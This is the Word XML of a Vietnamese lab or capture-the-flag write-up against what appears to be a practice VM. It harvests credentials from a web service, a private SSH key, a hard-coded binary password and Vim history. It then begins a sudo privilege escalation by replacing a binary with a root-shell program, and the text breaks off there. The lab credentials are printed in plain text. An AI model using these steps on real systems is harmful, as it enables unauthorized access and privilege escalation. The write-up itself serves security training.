      <w:r w:rsidR="00000000">
        <w:t>Khởi động dịch vụ Nginx.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B74F4FC" w14:textId="77777777" w:rsidR="00854BD8" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Lệnh thực thi:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50E76AE5" w14:textId="77777777" w:rsidR="00854BD8" w:rsidRDefault="00000000">
      <w:pPr>
        <w:ind w:left="397"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>sudo service nginx start</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58FCBD10" w14:textId="77777777" w:rsidR="00854BD8" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Giải thích: </w:t>
      </w:r>
      <w:r>
        <w:t>Khởi động Nginx theo yêu cầu của bài lab để phục vụ hoặc truy cập nội dung web cần thiết trong bước tiếp theo.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C3BE92B" w14:textId="2C84867E" w:rsidR="00D13AA3" w:rsidRDefault="00D13AA3">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="732867BD" wp14:editId="40D9AA1C">
            <wp:extent cx="6152515" cy="1931670"/>
            <wp:effectExtent l="0" t="0" r="635" b="0"/>
            <wp:docPr id="5188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9196" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId23"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6152515" cy="1931670"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FCBD4C2" w14:textId="5C7BD449" w:rsidR="00854BD8" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Mục đích: </w:t>
      </w:r>
      <w:r>
        <w:t>Truy cập dịch vụ web tại cổng 8080 bằng Lynx.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39ADE839" w14:textId="77777777" w:rsidR="00854BD8" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Lệnh thực thi:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FB2B310" w14:textId="593DE8E0" w:rsidR="00854BD8" w:rsidRDefault="00000000">
      <w:pPr>
        <w:ind w:left="397"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>lynx http://192.168.56.1</w:t>
      </w:r>
      <w:r w:rsidR="00D13AA3">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>16</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>:8080</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="658C5D47" w14:textId="77777777" w:rsidR="00854BD8" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Giải thích: </w:t>
      </w:r>
      <w:r>
        <w:t>Lynx là trình duyệt web dạng dòng lệnh. Truy cập địa chỉ trên để đọc nội dung, manh mối hoặc khóa SSH do dịch vụ cung cấp.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48A59FC5" w14:textId="3A9BB304" w:rsidR="002349DE" w:rsidRDefault="002349DE">
      <w:r>
        <w:t xml:space="preserve">Thu thập được: </w:t>
      </w:r>
      <w:r w:rsidRPr="002349DE">
        <w:t>Username: genphlux</w:t>
      </w:r>
      <w:r w:rsidRPr="002349DE">
        <w:br/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">                          </w:t>
      </w:r>
      <w:r w:rsidRPr="002349DE">
        <w:t>Password: HF9nd0cR!</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EE4A09E" w14:textId="77777777" w:rsidR="002349DE" w:rsidRDefault="00D13AA3">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:sz w:val="30"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="4FDC92CA" wp14:editId="4F64FB23">
            <wp:extent cx="6152515" cy="1175385"/>
            <wp:effectExtent l="0" t="0" r="635" b="5715"/>
            <wp:docPr id="34842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29131" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId24"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6152515" cy="1175385"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C77B10B" w14:textId="696AE51F" w:rsidR="002349DE" w:rsidRPr="002349DE" w:rsidRDefault="002349DE">
      <w:pPr>
        <w:rPr>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002349DE">
        <w:rPr>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Thực hiện đăng nhập SSH vào máy mục tiêu bằng tài khoản genphlux</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="727EF767" w14:textId="75411567" w:rsidR="002349DE" w:rsidRDefault="002349DE">
      <w:pPr>
        <w:rPr>
          <w:bCs/>
          <w:color w:val="EE0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002349DE">
        <w:rPr>
          <w:bCs/>
          <w:color w:val="EE0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">ssh </w:t>
      </w:r>
      <w:hyperlink r:id="rId25" w:history="1">
        <w:r w:rsidRPr="007B15AE">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:bCs/>
            <w:sz w:val="28"/>
            <w:szCs w:val="28"/>
          </w:rPr>
          <w:t>genphlux@192.168.56.1</w:t>
        </w:r>
        <w:r w:rsidRPr="007B15AE">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:bCs/>
            <w:sz w:val="28"/>
            <w:szCs w:val="28"/>
          </w:rPr>
          <w:t>16</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="0E29F28A" w14:textId="6153CBAF" w:rsidR="002349DE" w:rsidRDefault="002349DE">
      <w:pPr>
        <w:rPr>
          <w:bCs/>
          <w:color w:val="EE0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="66B9DDA7" wp14:editId="23A2F926">
            <wp:extent cx="6152515" cy="2740660"/>
            <wp:effectExtent l="0" t="0" r="635" b="2540"/>
            <wp:docPr id="23611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3034" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId26"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6152515" cy="2740660"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="443A9807" w14:textId="0941A75F" w:rsidR="002349DE" w:rsidRPr="002349DE" w:rsidRDefault="002349DE">
      <w:pPr>
        <w:rPr>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002349DE">
        <w:rPr>
          <w:bCs/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Kết quả kiểm tra thư mục của người dùng genphlux phát hiện tệp maleus. Lệnh file maleus xác định đây là khóa riêng RSA định dạng PEM. Nội dung khóa có thể được sử dụng để thử xác thực SSH cho một tài khoản khác nếu tìm được người dùng tương ứng và máy chủ chấp nhận khóa này.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31CB3BFA" w14:textId="3AFE8837" w:rsidR="00854BD8" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
          <w:sz w:val="30"/>
        </w:rPr>
        <w:t>5. Sử dụng SSH key và leo thang đặc quyền</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CC8B219" w14:textId="77777777" w:rsidR="00854BD8" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Mục đích: </w:t>
      </w:r>
      <w:r>
        <w:t>Lưu khóa SSH vào file sshkey và đặt quyền an toàn.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A653F7A" w14:textId="77777777" w:rsidR="00854BD8" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Lệnh thực thi:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3940EF5B" w14:textId="77777777" w:rsidR="00854BD8" w:rsidRDefault="00000000">
      <w:pPr>
        <w:ind w:left="397"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>vi sshkey</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B2B4D34" w14:textId="77777777" w:rsidR="00854BD8" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Lệnh thực thi:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="173D80E3" w14:textId="77777777" w:rsidR="00854BD8" w:rsidRDefault="00000000">
      <w:pPr>
        <w:ind w:left="397"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>chmod 600 sshkey</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D863266" w14:textId="77777777" w:rsidR="00854BD8" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Giải thích: </w:t>
      </w:r>
      <w:r>
        <w:t>Dùng vi tạo file sshkey rồi dán nội dung khóa riêng thu được từ dịch vụ web. Quyền 600 chỉ cho chủ sở hữu đọc và ghi, đáp ứng yêu cầu của SSH.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29443E85" w14:textId="1908BABC" w:rsidR="004364EA" w:rsidRDefault="004364EA">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="7EF08D31" wp14:editId="01B3F757">
            <wp:extent cx="6152515" cy="898525"/>
            <wp:effectExtent l="0" t="0" r="635" b="0"/>
            <wp:docPr id="205279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91551" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId27"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6152515" cy="898525"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CF7CA30" w14:textId="416E72A7" w:rsidR="00854BD8" w:rsidRDefault="002349DE">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="45313DFE" wp14:editId="187959B9">
            <wp:extent cx="6152515" cy="5186680"/>
            <wp:effectExtent l="0" t="0" r="635" b="0"/>
            <wp:docPr id="167389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99704" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId28"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6152515" cy="5186680"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
      <w:r w:rsidR="00000000">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Mục đích: </w:t>
      </w:r>
      <w:r w:rsidR="00000000">
        <w:t>Đăng nhập tài khoản maleus bằng khóa SSH.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09146C4E" w14:textId="77777777" w:rsidR="00854BD8" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Lệnh thực thi:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F8BB025" w14:textId="21B4C822" w:rsidR="00854BD8" w:rsidRDefault="00000000">
      <w:pPr>
        <w:ind w:left="397"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>ssh maleus@192.168.56.1</w:t>
      </w:r>
      <w:r w:rsidR="0072187C">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>16</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t xml:space="preserve"> -i sshkey</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CF1640A" w14:textId="77777777" w:rsidR="00854BD8" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Giải thích: </w:t>
      </w:r>
      <w:r>
        <w:t>Tùy chọn -i chỉ định file khóa riêng dùng để xác thực. Sau khi đăng nhập, tiếp tục kiểm tra file và quyền sudo của tài khoản maleus.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="602E26DD" w14:textId="39A2B819" w:rsidR="00854BD8" w:rsidRDefault="004364EA">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="327D74F8" wp14:editId="2C407FF3">
            <wp:extent cx="6152515" cy="1336675"/>
            <wp:effectExtent l="0" t="0" r="635" b="0"/>
            <wp:docPr id="135243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4244" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId29"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6152515" cy="1336675"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
      <w:r w:rsidR="00000000">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Mục đích: </w:t>
      </w:r>
      <w:r w:rsidR="00000000">
        <w:t>Kiểm tra file trong thư mục hiện tại và loại file dont_even_bother.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6595DDF3" w14:textId="77777777" w:rsidR="00854BD8" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Lệnh thực thi:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4170A22C" w14:textId="77777777" w:rsidR="00854BD8" w:rsidRDefault="00000000">
      <w:pPr>
        <w:ind w:left="397"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>ls -lah</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="190A453B" w14:textId="77777777" w:rsidR="00854BD8" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Lệnh thực thi:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A0EBAB5" w14:textId="77777777" w:rsidR="00854BD8" w:rsidRDefault="00000000">
      <w:pPr>
        <w:ind w:left="397"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>file dont_even_bother</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="621D7629" w14:textId="77777777" w:rsidR="00854BD8" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Giải thích: </w:t>
      </w:r>
      <w:r>
        <w:t>ls -lah hiển thị đầy đủ quyền, chủ sở hữu và các file ẩn. Lệnh file xác định định dạng thực tế của dont_even_bother để lựa chọn cách xử lý phù hợp.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="135C8657" w14:textId="77777777" w:rsidR="004364EA" w:rsidRDefault="004364EA">
      <w:pPr>
        <w:rPr>
          <w:b/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="48EE799E" wp14:editId="57098D5B">
            <wp:extent cx="6152515" cy="1002030"/>
            <wp:effectExtent l="0" t="0" r="635" b="7620"/>
            <wp:docPr id="49847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74698" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId30"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6152515" cy="1002030"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="4529F259" w14:textId="7CE29E93" w:rsidR="004364EA" w:rsidRDefault="004364EA">
      <w:pPr>
        <w:rPr>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004364EA">
        <w:rPr>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">Thực hiện lệnh </w:t>
      </w:r>
      <w:r w:rsidRPr="004364EA">
        <w:rPr>
          <w:bCs/>
          <w:color w:val="EE0000"/>
        </w:rPr>
        <w:t xml:space="preserve">strings dont_even_bother </w:t>
      </w:r>
      <w:r w:rsidRPr="004364EA">
        <w:rPr>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">để trích xuất các chuỗi văn bản từ file nhị phân. Kết quả phát hiện chương trình có chức năng yêu cầu và kiểm tra mật khẩu thông qua hàm strcmp. Đồng thời, mật khẩu </w:t>
      </w:r>
      <w:r w:rsidRPr="004364EA">
        <w:rPr>
          <w:bCs/>
          <w:color w:val="EE0000"/>
        </w:rPr>
        <w:t xml:space="preserve">xl8Fpx%6 </w:t>
      </w:r>
      <w:r w:rsidRPr="004364EA">
        <w:rPr>
          <w:bCs/>
        </w:rPr>
        <w:t>bị lưu trực tiếp trong file thực thi và có thể bị thu thập bằng kỹ thuật phân tích chuỗi. Đây là lỗi hard-coded credential.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="673A4631" w14:textId="2B751DB6" w:rsidR="004364EA" w:rsidRDefault="004364EA">
      <w:pPr>
        <w:rPr>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="47019793" wp14:editId="02A07C39">
            <wp:extent cx="6152515" cy="3046730"/>
            <wp:effectExtent l="0" t="0" r="635" b="1270"/>
            <wp:docPr id="182853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33255" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId31"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6152515" cy="3046730"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="1103CD19" w14:textId="55175F6F" w:rsidR="004364EA" w:rsidRDefault="004364EA">
      <w:pPr>
        <w:rPr>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="004364EA">
        <w:rPr>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">Thực hiện đọc file .viminfo để kiểm tra lịch sử và các register được Vim lưu lại. Trong phần Registers, phát hiện chuỗi </w:t>
      </w:r>
      <w:r w:rsidRPr="001F32E9">
        <w:rPr>
          <w:bCs/>
          <w:color w:val="EE0000"/>
        </w:rPr>
        <w:t xml:space="preserve">B^slc8I$ </w:t>
      </w:r>
      <w:r w:rsidRPr="004364EA">
        <w:rPr>
          <w:bCs/>
        </w:rPr>
        <w:t>liên quan đến nội dung passwd. Đây có thể là thông tin xác thực đã bị lưu lại trong lịch sử Vim và được sử dụng để thử đăng nhập hoặc chuyển sang tài khoản tiếp theo.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A6FA906" w14:textId="130E11D3" w:rsidR="004364EA" w:rsidRPr="004364EA" w:rsidRDefault="004364EA">
      <w:pPr>
        <w:rPr>
          <w:bCs/>
          <w:color w:val="EE0000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="1DCE802E" wp14:editId="41F178E5">
            <wp:extent cx="6152515" cy="5146040"/>
            <wp:effectExtent l="0" t="0" r="635" b="0"/>
            <wp:docPr id="43353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7107" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId32"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6152515" cy="5146040"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AD4127E" w14:textId="5D2FF1CF" w:rsidR="00854BD8" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Mục đích: </w:t>
      </w:r>
      <w:r>
        <w:t>Kiểm tra quyền sudo của tài khoản hiện tại.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54D61B94" w14:textId="77777777" w:rsidR="00854BD8" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Lệnh thực thi:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34ECD243" w14:textId="77777777" w:rsidR="00854BD8" w:rsidRDefault="00000000">
      <w:pPr>
        <w:ind w:left="397"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>sudo -l</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C4B117A" w14:textId="77777777" w:rsidR="00854BD8" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Giải thích: </w:t>
      </w:r>
      <w:r>
        <w:t>Lệnh liệt kê các chương trình mà người dùng được phép chạy bằng sudo. Kết quả là cơ sở để xác định đường leo thang đặc quyền.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CED58F1" w14:textId="254E2358" w:rsidR="00854BD8" w:rsidRDefault="001F32E9">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="41AEA589" wp14:editId="1E9A7908">
            <wp:extent cx="6152515" cy="1388110"/>
            <wp:effectExtent l="0" t="0" r="635" b="2540"/>
            <wp:docPr id="43342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27181" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId33"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6152515" cy="1388110"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
      <w:r w:rsidR="00000000">
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">Mục đích: </w:t>
      </w:r>
      <w:r w:rsidR="00000000">
        <w:t>Thay file dont_even_bother bằng chương trình tạo root shell.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4879F4B6" w14:textId="77777777" w:rsidR="00854BD8" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Lệnh thực thi:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09ADB7D2" w14:textId="77777777" w:rsidR="00854BD8" w:rsidRDefault="00000000">
      <w:pPr>
        <w:ind w:left="397"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>rm dont_even_bother</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6871B4A0" w14:textId="77777777" w:rsidR="00854BD8" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Lệnh thực thi:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D2B46F2" w14:textId="77777777" w:rsidR="00854BD8" w:rsidRDefault="00000000">
      <w:pPr>
        <w:ind w:left="397"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="23"/>
        </w:rPr>
        <w:t>vi dont_even_bother.c</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="304DB68A" w14:textId="77777777" w:rsidR="00854BD8" w:rsidRDefault="00000000">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Lệnh thực thi:</w:t>
      </w:r>
